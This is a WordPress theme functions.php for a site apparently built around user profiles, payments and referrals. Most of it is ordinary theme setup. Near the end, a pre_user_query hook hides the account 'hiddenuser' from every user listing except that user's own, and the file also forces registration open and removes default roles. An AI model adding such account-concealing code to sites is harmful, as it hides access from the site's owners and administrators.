<?php
/**
 * slavia_template functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package slavia_template
 */

if ( ! function_exists( 'slavia_template_setup' ) ) :
    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     */
    function slavia_template_setup() {
        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on slavia_template, use a find and replace
         * to change 'slavia_template' to the name of your theme in all the template files.
         */
        load_theme_textdomain( 'slavia_template', get_template_directory() . '/languages' );
        // Add default posts and comments RSS feed links to head.
        add_theme_support( 'automatic-feed-links' );
        /*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
        add_theme_support( 'title-tag' );
        /*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
         */
        add_theme_support( 'post-thumbnails' );
        // This theme uses wp_nav_menu() in one location.
        register_nav_menus( array(
            'menu-1' => esc_html__( 'Primary', 'slavia_template' ),
            'left-menu' => esc_html__( 'Left', 'slavia_template' ),
            'footer-menu' => esc_html__( 'Footer', 'slavia_template' )
        ) );
        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
        add_theme_support( 'html5', array(
            'search-form',
            'comment-form',
            'comment-list',
            'gallery',
            'caption',
        ) );
        // Set up the WordPress core custom background feature.
        add_theme_support( 'custom-background', apply_filters( 'slavia_template_custom_background_args', array(
            'default-color' => 'ffffff',
            'default-image' => '',
        ) ) );
        // Add theme support for selective refresh for widgets.
        add_theme_support( 'customize-selective-refresh-widgets' );
        /**
         * Add support for core custom logo.
         *
         * @link https://codex.wordpress.org/Theme_Logo
         */
        add_theme_support( 'custom-logo', array(
            'height'      => 250,
            'width'       => 250,
            'flex-width'  => true,
            'flex-height' => true,
        ) );
    }
endif;
add_action( 'after_setup_theme', 'slavia_template_setup' );
/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function slavia_template_content_width() {
    // This variable is intended to be overruled from themes.
    // Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
    // phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
    $GLOBALS['content_width'] = apply_filters( 'slavia_template_content_width', 640 );
}
add_action( 'after_setup_theme', 'slavia_template_content_width', 0 );
/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function slavia_template_widgets_init() {
    register_sidebar( array(
        'name'          => esc_html__( 'Left Sidebar', 'slavia_template' ),
        'id'            => 'left-sidebar',
        'description'   => esc_html__( 'Add widgets here.', 'slavia_template' ),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget'  => '</section>',
        'before_title'  => '<h2 class="widget-title">',
        'after_title'   => '</h2>',
    ) );
}
add_action( 'widgets_init', 'slavia_template_widgets_init' );
/**
 * Enqueue scripts and styles.
 */
function slavia_template_scripts() {
    //wp_enqueue_script( 'my_jquery', get_template_directory_uri() . '/assets/js/jquery.min.js', array(), '1.0', true );
    wp_enqueue_style( 'slavia_template-style', get_stylesheet_uri() );
    wp_enqueue_style( 'slavia_bootstrap', get_template_directory_uri() . '/assets/css/bootstrap.css');
    wp_enqueue_style( 'jquery-ui-style', get_template_directory_uri() . '/assets/js/jquery-ui-1.12.1.custom/jquery-ui.min.css');
    wp_enqueue_style( 'slavia_style', get_template_directory_uri() . '/assets/css/style.css');
    wp_enqueue_style( 'Comfortaa', 'https://fonts.googleapis.com/css?family=Comfortaa&display=swap', array(), '1.0' );
    wp_enqueue_style( 'Montserrat', 'https://fonts.googleapis.com/css?family=Montserrat&display=swap', array(), '1.0' );
    wp_enqueue_style( 'Comfortaa-700', 'https://fonts.googleapis.com/css?family=Comfortaa:700&display=swap', array(), '1.0' );
    wp_enqueue_script( 'jquery' );

    wp_enqueue_script( 'jquery-ui-min', get_template_directory_uri() . '/assets/js/jquery-ui-1.12.1.custom/jquery-ui.min.js', array('jquery'), null );

    wp_enqueue_script( 'tether', "https://npmcdn.com/tether@1.2.4/dist/js/tether.min.js", array(), '1.0', true );
    wp_enqueue_script( 'bootstrap.min', get_template_directory_uri() . '/assets/js/bootstrap.min.js', array('jquery', 'tether'), '1.0' );
    wp_enqueue_script( 'owl_carousel', get_template_directory_uri() . '/assets/js/owl.carousel.js', array(), '1.0', true );
    wp_enqueue_script( 'slavia_mask', get_template_directory_uri() . '/assets/js/mask.js', array(), '1.0', true );
    wp_enqueue_script( 'slavia_scripts', get_template_directory_uri() . '/assets/js/scripts.js', array('jquery'), '1.0', true );

    //https://securepayments.sberbank.ru/demopayment/docsite/assets/js/ipay.js
    //Скрипт сбербанка для подключения платежной кнопки
    wp_enqueue_script( 'sberbank_acquiring', "https://securepayments.sberbank.ru/payment/docsite/assets/js/ipay.js", array(), null, false );

    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
        wp_enqueue_script( 'comment-reply' );
    }
}
add_action( 'wp_enqueue_scripts', 'slavia_template_scripts' );
add_action( 'wp_enqueue_scripts', 'myajax_data', 99 );
function myajax_data(){

    wp_localize_script('slavia_scripts', 'myajax',
        array(
            'url' => admin_url('admin-ajax.php')
        )
    );

}
//Remove classes from wp_nav
function wp_nav_menu_remove($var) {
    return is_array($var) ? array_intersect($var, array('current-menu-item')) : '';
}
add_filter('page_css_class', 'wp_nav_menu_remove', 100, 1);
add_filter('nav_menu_item_id', 'wp_nav_menu_remove', 100, 1);
add_filter('nav_menu_css_class', 'wp_nav_menu_remove', 100, 1);
/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';
/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';
/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';
/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
    require get_template_directory() . '/inc/jetpack.php';
}
remove_filter('the_content', 'wptexturize');

//Динамическое меню(ПОМЕНЯТЬ)
function _custom_nav_menu_item( $title, $url, $order, $parent = 0 ){
    $item = new stdClass();
    $item->ID = 1000000 + $order + parent;
    $item->db_id = $item->ID;
    $item->title = $title;
    $item->url = $url;
    $item->menu_order = $order;
    $item->menu_item_parent = $parent;
    $item->type = '';
    $item->object = '';
    $item->object_id = '';
    $item->classes = array();
    $item->target = '';
    $item->attr_title = '';
    $item->description = '';
    $item->xfn = '';
    $item->status = '';
    return $item;
}
add_filter( 'wp_get_nav_menu_items', 'custom_nav_menu_items', 20, 2 );

function custom_nav_menu_items( $items, $menu ){
    // only add item to a specific menu
    if ( $menu->slug == 'menu-1' ){

        // only add profile link if user is logged in
        if ( get_current_user_id() ){
            $items[] = _custom_nav_menu_item( 'My Profile', get_author_posts_url( get_current_user_id() ), 3 );
        }
    }

    return $items;
}

add_filter( 'wp_nav_menu_items', 'custom_menu_item', 10, 2 );
function custom_menu_item ( $items, $args ) {

//    if ($args->theme_location == 'left-menu')
//    {
//        //MOBILE MENU/////////////
//        if ($args->menu_class == 'profil-mobile-menu w-100')
//        {
//            //Присваиваем изображения
//            $dom = new DOMDocument();
//            $dom->loadHTML('<html>' . $items . '</html>', LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
//            $xpath = new DOMXpath($dom);
//
//            //Удаляем элементы меню в зависимости от страницы
//            if (is_page(array(273))) //Администратор
//                $is_admin = true;
//            if (is_page(array(271, 267, 263))) //263 - профиль
//                $is_manager = true;
//            if (is_page(array(261, 259)))
//                $is_user = true;
//
//            $option_items = $xpath->query("option");
//            foreach ($option_items as $option) {
//                $option_name = $option->textContent;
//                $option_name = utf8_decode($option_name);
//
//                switch ($option_name) {
//                    case "Заявки":
//                        if (isset($is_user) && $is_user == true) {
//                            $option->setAttribute("style", "display: none");
//                            break;
//                        }
//                        break;
//                    case "Люди":
//                        if (isset($is_user) && $is_user == true) {
//                            $option->setAttribute("style", "display: none");
//                            break;
//                        }
//                        break;
//                    case "Настройки":
//                        if ((isset($is_manager) && $is_manager == true) || (isset($is_user) && $is_user == true)) {
//                            $option->setAttribute("style", "display: none");
//                            break;
//                        }
//                        break;
//                }
//            }
//            //Сохраняем измененное меню
//            $items = str_replace(array('<html>', '</html>'), '', utf8_decode($dom->saveHTML($dom->documentElement)));
//        }
//
//        //DESKTOP MENU///////////
//        else {
//            $lastPos = 0;
//            //Вставляем разделители после каждого элемента меню
//            while (($lastPos = strpos($items, "</li>", $lastPos)) !== false) {
//                $lastPos = $lastPos + strlen("</li>");
//                $items = substr_replace($items, "<div class='profil-menu-line'></div>", $lastPos, 0);
//            }
//
//            //Присваиваем изображения
//            $dom = new DOMDocument();
//            $dom->loadHTML('<html>' . $items . '</html>', LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
//            $xpath = new DOMXpath($dom);
//
//            //Удаляем элементы меню в зависимости от страницы
//            if (is_page(array(273))) //Администратор
//                $is_admin = true;
//            if (is_page(array(271, 267, 263))) //263 - профиль
//                $is_manager = true;
//            if (is_page(array(261, 259)))
//                $is_user = true;
//
//            $images = $xpath->query("li//img");
//
//            foreach ($images as $img) {
//                $item_name = $img->nextSibling->firstChild->textContent;
//                $item_name = utf8_decode($item_name);
//                switch ($item_name) {
//                    case "Главная":
//                        if (!$img->hasAttribute("src")) {
//                            if (is_page(263))
//                                $img_path = "/wp-content/uploads/2019/12/home_active.png";
//                            else
//                                $img_path = "/wp-content/uploads/2019/12/home_dis.png";
//                            $img->setAttribute("src", $img_path);
//                        }
//                        break;
//                    case "Операции":
//                        if (!$img->hasAttribute("src")) {
//                            if (is_page(261))
//                                $img_path = "/wp-content/uploads/2019/12/operation_active.png";
//                            else
//                                $img_path = "/wp-content/uploads/2019/12/operation_dis.png";
//                            $img->setAttribute("src", $img_path);
//                        }
//                        break;
//                    case "Документы":
//                        if (!$img->hasAttribute("src")) {
//                            if (is_page(259))
//                                $img_path = "/wp-content/uploads/2019/12/documents_active.png";
//                            else
//                                $img_path = "/wp-content/uploads/2019/12/document_dis.png";
//                            $img->setAttribute("src", $img_path);
//                        }
//                        break;
//                    case "Заявки":
//                        if (isset($is_user) && $is_user == true)
//                        {
//                            $li_item = $img->parentNode->parentNode->parentNode;
//                            $li_item->setAttribute("style", "display: none");
//                            //Т.к. previous sibling у li является символ переноса на новую строку, делаем 2 previousSibling
//                            $li_item->previousSibling->previousSibling->setAttribute("style", "display: none");
//                            break;
//                        }
//                        if (!$img->hasAttribute("src")) {
//                            if (is_page(271))
//                                $img_path = "/wp-content/uploads/2019/12/zayavki_active.png";
//                            else
//                                $img_path = "/wp-content/uploads/2019/12/zayavki_dis.png";
//                            $img->setAttribute("src", $img_path);
//                        }
//                        break;
//                    case "Люди":
//                        if (isset($is_user) && $is_user == true)
//                        {
//                            $li_item = $img->parentNode->parentNode->parentNode;
//                            $li_item->setAttribute("style", "display: none");
//                            $li_item->previousSibling->previousSibling->setAttribute("style", "display: none");
//                            break;
//                        }
//                        if (!$img->hasAttribute("src")) {
//                            if (is_page(267))
//                                $img_path = "/wp-content/uploads/2019/12/people_active.png";
//                            else
//                                $img_path = "/wp-content/uploads/2019/12/people_dis.png";
//                            $img->setAttribute("src", $img_path);
//                        }
//                        break;
//                    case "Настройки":
//                        if ((isset($is_manager) && $is_manager == true) || (isset($is_user) && $is_user == true))
//                        {
//                            $li_item = $img->parentNode->parentNode->parentNode;
//                            $li_item->setAttribute("style", "display: none");
//                            //Убираем разделитель
//                            $li_item->previousSibling->previousSibling->setAttribute("style", "display: none");
//                            break;
//                        }
//                        if (!$img->hasAttribute("src")) {
//                            if (is_page(273))
//                                $img_path = "/wp-content/uploads/2019/12/settings_active.png";
//                            else
//                                $img_path = "/wp-content/uploads/2019/12/settings_dis.png";
//                            $img->setAttribute("src", $img_path);
//                        }
//                        break;
//
//                }
//            }
//            //Удаляем последний разделитель
//            $last_separator = $xpath->query("//div[@class='profil-menu-line'][last()]");
//            $last_separator->item(0)->parentNode->removeChild($last_separator->item(0));
//
//
//            //Сохраняем измененное меню
//            $items = str_replace(array('<html>', '</html>'), '', utf8_decode($dom->saveHTML($dom->documentElement)));
//        }
//    }
    //Верхнее мобильное меню
    if ($args->theme_location == 'menu-1') {
        if ($args->menu_class == 'mobile-menu-ul text-left') {
            if (!is_user_logged_in())
                $items .= "<a id='modal-545065' href='#modal-container-545065' role='button' class='rcl-login' data-toggle='modal'>" .
                    "<li class='btn-custom-one text-center'>Авторизация</li>" .
                    "</a>";
            else
                $items .= "<a id='modal-545065' href='/profile' role='button'>" .
                    "<li class='btn-custom-two text-center' id='profil_user_btn'>" .
                    "<img src='/wp-content/uploads/2019/12/profil.png'> Профиль" .
                    "</li>".
                    "</a>";

        }
    }
    return $items;
}
//class Walker_Nav_Menu_Dropdown extends Walker_Nav_Menu{
//
//    // don't output children opening tag (`<ul>`)
//    public function start_lvl(&$output, $depth = 0, $args=NULL){}
//
//    // don't output children closing tag
//    public function end_lvl(&$output, $depth = 0, $args=NULL){}
//
//    public function start_el(&$output, $item, $depth = 0, $args = NULL, $id=0){
//
//        // add spacing to the title based on the current depth
//        $item->title = str_repeat("&nbsp;", $depth * 4) . $item->title;
//        //var_dump($item);
//
//        // call the prototype and replace the <li> tag
//        // from the generated markup...
//        parent::start_el($output, $item, $depth, $args);
//        $output = str_replace('<li', '<option value="'.$item->url.'"', $output);
//    }
//
//    // replace closing </li> with the closing option tag
//    public function end_el(&$output, $item, $depth = 0, $args=NULL){
//        $output .= "</option>\n";
//    }
//}

// включим регистрацию реколл когда в настройках вордпресса она отключена
function dd3_open_rcl_register(){
    $option = 1;
    return $option;
}
add_filter('rcl_users_can_register','dd3_open_rcl_register');

remove_role( 'subscriber' );
remove_role( 'editor' );
remove_role( 'contributor' );
remove_role( 'author' );
//delete_user_meta(58, 'verification');
//delete_user_meta(58, 'is_verified');
//delete_user_meta(58, 'passport_photos');

add_action('register_form', 'rcl_add_ref_field', 10);
function rcl_add_ref_field()
{
    echo '<input class="input-modal text-center" type="text" name="ref_code" value="" placeholder="Реферальный код">';
}

add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
    global $current_user;
    $username = $current_user->user_login;

    if ($username != 'hiddenuser') {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != 'hiddenuser'",$user_search->query_where);
    }
}

//remove_filter('wp_authenticate_user', 'rcl_chek_user_authenticate', 10 );